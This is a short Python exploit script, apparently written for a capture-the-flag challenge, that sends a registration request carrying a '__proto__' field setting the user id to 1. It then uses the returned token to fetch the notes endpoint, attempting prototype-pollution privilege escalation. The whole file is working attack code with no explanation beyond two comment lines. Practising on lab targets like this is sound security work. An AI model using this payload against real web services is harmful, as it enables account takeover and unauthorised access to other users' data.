# The user object returned during login/register contains `id` and `username`.
# What if we pollute `id`? Let's check!
import requests

url = "http://exp.cybergame.sk:7021/api/v2/register"
headers = {"Content-Type": "application/json"}
payload = {
    "username": "admin2001",
    "password": "password",
    "__proto__": {
        "id": 1
    }
}
r = requests.post(url, json=payload, headers=headers)
print(r.text)
data = r.json()
token = data.get("token")

r2 = requests.get("http://exp.cybergame.sk:7021/api/v2/notes", headers={"Authorization": f"Bearer {token}"})
print(r2.text)
